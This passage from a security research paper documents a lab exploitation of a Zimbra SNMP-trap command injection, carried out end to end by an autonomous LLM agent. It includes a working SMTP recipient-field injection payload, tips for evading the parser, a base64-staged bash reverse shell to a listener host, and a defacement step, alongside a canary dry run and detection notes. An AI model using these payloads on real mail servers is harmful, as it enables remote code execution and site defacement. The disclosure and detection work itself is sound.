
% =============================================================================
\section{Lab, Methodology, and the Agent Pipeline}
\label{sec:lab}

\subsection{Isolated lab}

All experiments ran in a Docker lab with \textbf{zero runtime egress}: an
\texttt{--internal} bridge network \texttt{zmdemo} (172.30.0.0/24) with no
external route. The only egress in the entire lifecycle is the documented,
one-time image build (Ubuntu archive + \texttt{repo.zimbra.com} component
packages + GPG key).

\begin{figure*}[t]
\centering
\includegraphics[width=\textwidth]{\figdir/fig12-lab-topology.png}
\caption{Lab topology. Attacker = the Kali host (bridge gateway
172.30.0.1) hosting the agent, the reverse-shell listener, the weapon HTTP
server (defacement assets), and the canary verifier. Target = container
\texttt{zmdemo-snmp} (172.30.0.20, \texttt{mail.zmdemo2.lab}, ZCS 10.1.0 GA).
No external route exists at runtime.}
\label{fig:topo}
\end{figure*}

\textbf{Target image.} Zimbra \texttt{NETWORK 10.1.0 GA (build 4655,
2024-08-19)} on Ubuntu 22.04, installed with the official
\texttt{install.sh -s -x --skip-upgrade-check --skip-activation-check}
(flow, tarball SHA-256
\texttt{58d37755\hspace{0pt}e6152c90\hspace{0pt}47b82698\hspace{0pt}9c3e0338\hspace{0pt}d2455c12\hspace{0pt}279daadd\hspace{0pt}683d31de\hspace{0pt}ebb41dc6}
matching the vendor's \texttt{.sha256} sidecar). The image build and
provisioning are fully reproducible from \texttt{lab/build-lab.sh}
(\texttt{Dockerfile.101} + defaults file + entrypoint).

\textbf{Documented lab conditions.} Two conditions mirror what the vendor
left implicit, and we document both explicitly (lab-conditions S-A and S-B):
\begin{itemize}
\item \textbf{S-A — SNMP notifications enabled}: \texttt{snmp\_notify=1},
\texttt{snmp\_trap\_host=172.30.0.1} (the attacker, i.e.\ where the trap
``would'' go), and \texttt{mynetworks} extended to the bridge
(\texttt{127.0.0.0/8 172.30.0.0/24}) so the attacker address is inside the
MTA's accepted range. This instantiates precondition (i) of
Section~\ref{sec:precond}.
\item \textbf{S-B — mail-to-SNMP trigger}. Stock 10.1.0 GA ships the
\texttt{doSNMP} sink but no verified stock \texttt{watchfor} that captures a
\emph{mail-recipient} field into it. The vendor did not name the stock
trigger; CERT Polska's active-exploitation IOC (forged ``Service status
change'' lines) implies a status-change watchfor. Our lab therefore appends
the documented trigger of Listing~\ref{lst:sb-trigger} to
\texttt{swatchrc.in} (persisted) and the active \texttt{swatchrc}. The
pattern matches a Postfix \emph{bounce} line for an undeliverable recipient
(relay=none) — precisely the shape produced by a crafted non-mailbox
address — and feeds the captured address into the sink. Both lab and
patched-lab containers carry the identical S-A/S-B conditions, so fix
verification is an A/B comparison with everything else controlled.
\end{itemize}

\begin{lstlisting}[style=shell,label={lst:sb-trigger},caption={Lab condition S-B: the mail-to-SNMP trigger appended to \texttt{swatchrc.in} and \texttt{swatchrc}}]
# EP.02 lab condition (S-B): mail -> snmp trigger (documented)
watchfor /postfix\/smtp\[\d+\]: [0-9A-F]+: to=<(.+?)>, relay=none,.*status=bounced/
    donotify SERVICE=$1,STATUS=started,HOST=localhost
\end{lstlisting}

\textbf{Integrity controls.} A lab flag
(\texttt{/root/flag.txt} =
\texttt{ZMDEMO\{10.1.0-snmp-\hspace{0pt}trap-lost-in-logs-\hspace{0pt}2026-73570\}}) provides the
capture objective; stock assets (e.g.\ both \texttt{LoginBanner.png} files)
are md5-baselined before and after every run; the lab is restored to stock
state after each experiment. Raw recordings, beat logs, and shell sessions
are kept as chain-of-custody evidence with SHA-256 manifests.

\subsection{The autonomous agent pipeline}
\label{sec:agent}

The reconnaissance, exploitation, verification, and documentation pipeline
was operated by an autonomous LLM agent (\textbf{XPECTRA-AGENT}) —
specifically, a planning/execution loop with a hard discipline: \emph{think
then act}. Every reasoning step (REASON/PLAN/OBSERVE) is written to a
``cognitive core'' log \emph{before} the corresponding command executes; the
barrier is structural (the act only fires after the think is logged), which
makes the entire decision process auditable after the fact.

\begin{figure*}[t]
\centering
\begin{subfigure}[t]{0.48\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig02-recon-thinking.png}
\caption{THINK phase: the cognitive core reasons about target liveness while
the execution terminal runs the recon checks (webmail 443, SMTP banner 25).}
\end{subfigure}
\hfill
\begin{subfigure}[t]{0.48\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig10-opsmap-crop.png}
\caption{The operations map (auto-generated from the beat log) at mission end:
all 7 stages complete. Every stage transition is timestamped in the beat log.}
\end{subfigure}
\caption{Agent pipeline evidence. (a) The think/act split on camera; (b) the
operations map — RECON $\rightarrow$ ENUMERATION $\rightarrow$ VERIFICATION
$\rightarrow$ EXPLOITATION $\rightarrow$ SHELL $\rightarrow$ DEFACEMENT
$\rightarrow$ FLAG — generated from the same beat log that drives the
phase-highlighting in our recordings.}
\label{fig:agent}
\end{figure*}

The pipeline maintains a 7-stage operations map (Figure~\ref{fig:agent}b) and
a beat log (\texttt{(epoch, MODE)} pairs: \texttt{THINK}/\texttt{ACT}/
\texttt{BROW}) that serves three purposes: (i) the on-camera narrative,
(ii) deterministic post-production timing, and (iii) — for this paper — a
machine-readable record of \emph{plan coherence}. We return to it in
Section~\ref{sec:ethics}: recent work on LLM pentesting agents
(CHECKMATE~\cite{wang2025checkmate}) identifies incoherent long-horizon
planning as the dominant failure mode; our beat log allows that claim to be
checked against a real, multi-stage, real-vulnerability execution rather than
a benchmark.

\textbf{Experimental protocol.} Every exploitation phase follows the same
discipline: \emph{dry-run before kill-shot}. Before any payload with side
effects is sent, a canary payload (write one empty file, nothing else)
proves that the sink executes. This negative-control design keeps the
evidentiary chain clean: the canary result is sufficient to prove
vulnerability; the reverse shell is only the impact demonstration.

% =============================================================================
\section{Exploitation: Evidence}
\label{sec:exploit}

\subsection{The trigger path (empirical)}

The vendor did not name the trigger field; CERT Polska's IOC suggests
status-change log lines. Our trigger matrix tested three SMTP surfaces —
\texttt{RCPT TO:} (recipient), \texttt{MAIL FROM:} (sender), and
\texttt{Subject:} — against the S-B trigger. The \textbf{confirmed vector is
the recipient field}: the S-B \texttt{watchfor} matches
\texttt{to=<...>} in postfix bounce lines, and a crafted \emph{quoted}
local part survives envelope handling into the log verbatim:

\begin{lstlisting}[style=smtp,caption={Confirmed trigger (RCPT surface) — wire form}]
>>> EHLO cve-73570-canary-check.local
<<< 250-mail.zmdemo2.lab
>>> MAIL FROM: <cve-73570-canary@mail.zmdemo2.lab>
<<< 250 2.1.0 Ok
>>> RCPT TO: <"cve73570canary$(touch${IFS}/tmp/cve-73570-canary)@mail.zmdemo2.lab">
<<< 250 2.1.5 Ok
>>> DATA
<<< 354 End data with <CR><LF>.<CR><LF>
>>> Subject: CVE-2026-73570 canary check (authorized)
>>> .
<<< 250 2.0.0 Ok: queued as C5D4D2C9361
\end{lstlisting}

\textbf{Payload anatomy.} The local part is
\texttt{"cve73570canary\$(touch\${IFS}/\hspace{0pt}tmp/cve-73570-canary)@host"}. Three
wire constraints shaped it, each learned by failing and re-testing:
\begin{enumerate}
\item \textbf{Quoted local part} (\texttt{"..."}) is required: unquoted
      addresses containing \texttt{()} are rejected or truncated by the
      envelope parser before logging.
\item \textbf{No literal spaces}: postfix address parsing truncates at
      spaces. \texttt{\${IFS}} is the standard shell-substitution space
      substitute — inside a \texttt{\$(...)} context the shell expands it to
      a space at \emph{execution} time, after the address has already been
      logged.
\item \textbf{No \texttt{<} or \texttt{>}}: the address parser treats
      \texttt{>}\ as the address terminator even inside quotes, so
      redirects (\texttt{5<>}) and here-docs are unusable on the wire. The
      reverse-shell payload therefore stages via base64
      (\texttt{echo b64|base64 -d|bash}) instead of inline \texttt{5<>}.
\end{enumerate}

\subsection{Negative control: the dry run}

The dry-run payload (Listing above) executes
\texttt{touch\${IFS}/tmp/cve-73570-canary} — it creates one empty file and
does nothing else. Results (identical in both our tooling, the
\texttt{exploit\_snmp.py --mode dry-run} and the
\texttt{detect\_snmp\_sink.py --active} detector):

\begin{itemize}
\item The message is queued normally (\texttt{250 2.0.0 Ok}), then bounced
      (no such mailbox) — the bounce is what the S-B \texttt{watchfor}
      matches.
\item Within \textbf{$\approx$25 seconds} (swatch file-tail latency), the
      canary exists on the target, owned by \texttt{zimbra:zimbra}, mode
      \texttt{0600}.
\item \texttt{zmswatch.out} (swatchdog's stdout) gains the line
      \texttt{SNMP notification: ...} — the sink's own execution record.
\end{itemize}

\begin{lstlisting}[style=shell,caption={Dry-run verification (canary created by the sink, not by any direct access)}]
$ docker exec zmdemo-snmp ls -la /tmp/cve-73570-canary
-rw------- 1 zimbra zimbra 0 Aug 24 03:05 /tmp/cve-73570-canary
$ docker exec zmdemo-snmp tail -n 3 /opt/zimbra/log/zmswatch.out
SNMP notification: postfix/smtp[4655]: C5D4D2C9361: to=<"cve73570canary$(touch /tmp/cve-73570-canary)@mail.zmdemo2.lab">, relay=none, delay=0.1, delays=0/0.1/0/0, dsn=2.0.0, status=bounced
\end{lstlisting}

The dry run is the scientific core of the demonstration: it proves
\emph{arbitrary command execution as zimbra} with a payload whose only
effect is a file timestamp — zero side effects, fully reversible, and it
cannot be explained by anything other than the sink executing the captured
text.

\subsection{The kill-shot: reverse shell}

With the sink proven, the reverse-shell payload
\texttt{echo\${IFS}PGIvYmluL2Jhc2gg...\hspace{0pt}|base64\${IFS}-d|bash} decodes to:

\begin{lstlisting}[style=shell]
/bin/bash -i 5<> /dev/tcp/172.30.0.1/4444 0<&5 1>&5 2>&5
\end{lstlisting}

The listener (172.30.0.1:4444) accepts the connection \textbf{1--2 seconds
after the \texttt{250} queue ack}; the shell identifies itself as:

\begin{lstlisting}[style=shell,caption={Captured shell identity}]
$ id
uid=1000(zimbra) gid=1000(zimbra) groups=1000(zimbra),1001(smtpd),1011(zimbra)
$ hostname
mail
\end{lstlisting}

\begin{figure*}[t]
\centering
\begin{subfigure}[t]{0.48\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig04-sink-live.png}
\caption{Live exploitation on camera: the crafted message is queued, the
listener is pre-armed, and the shell is establishing.}
\end{subfigure}
\hfill
\begin{subfigure}[t]{0.48\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig09-flag-crop.png}
\caption{Flag capture: \texttt{cat /root/flag.txt} as zimbra — the
capture-the-flag objective for the lab.}
\end{subfigure}
\caption{Exploitation evidence from the recorded run.}
\label{fig:exploit}
\end{figure*}

\textbf{Process-level evidence.} At exploitation time the target process
tree shows the exact chain of Section~\ref{sec:vuln}: \texttt{swatchdog}
(perl) spawns \texttt{/bin/sh -c '...base64...'} whose child is the
interactive bash holding the \texttt{/dev/tcp/172.30.0.1/4444} socket —
the same shape our Sigma rule \texttt{cve2026\_73570\_swatch\_dosnmp\_cmd\_injection}
matches (Section~\ref{sec:detection}). Server-side attribution survives in
the logs: \texttt{grep -a 'L2Jpbi9iYXNo' /var/log/zimbra.log}
(\texttt{L2Jpbi9iYXNo} is the base64 of \texttt{/bin/bash}) recovers the
injected line from the MTA's own record of the event.

\subsection{Post-exploitation impact: defacement as visible proof}

Post-exploitation used the compromised shell to swap the static webmail and
admin login banners (single-file \texttt{curl} of attacker assets, one
asset each, reversible, with backups) — chosen as the minimal visible
proof that a non-privileged \texttt{zimbra} shell can alter what end users
see, without touching mail data. The swap reflects instantly (static files,
no restart):

\begin{figure*}[t]
\centering
\begin{subfigure}[t]{0.55\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig05-deface-reveal.png}
\caption{The reveal: the webmail login page now serves the pwned banner —
first paint of a fresh browser (empty profile, no cache).}
\end{subfigure}
\hfill
\begin{subfigure}[t]{0.42\textwidth}
\centering
\includegraphics[width=\textwidth]{\figdir/fig05c-deface-logo-closeup.png}
\caption{Close-up: the \texttt{zimbra} wordmark with the attacker banner
burned over it.}
\end{subfigure}
\caption{Defacement evidence (lab-only PoC banner).}
\label{fig:deface}
\end{figure*}

The mission-complete state (flag captured, 7/7 operations map, completion
banner) is shown in Figure~\ref{fig:mission}; the approved full recordings
(cinematic 3:24, vertical reel 1:28) are published with the companion folder
(\texttt{videos/}).

\begin{figure*}[t]
\centering
\includegraphics[width=0.92\textwidth]{\figdir/fig06-mission-complete.png}
\caption{Mission complete: flag in the execution terminal, completion banner,
operations map 7/7. Every claim on this frame was verified by frame-level
inspection of the recorded run (flag string OCR-verified, shell session
logged, banner md5-verified on disk).}
\label{fig:mission}
\end{figure*}
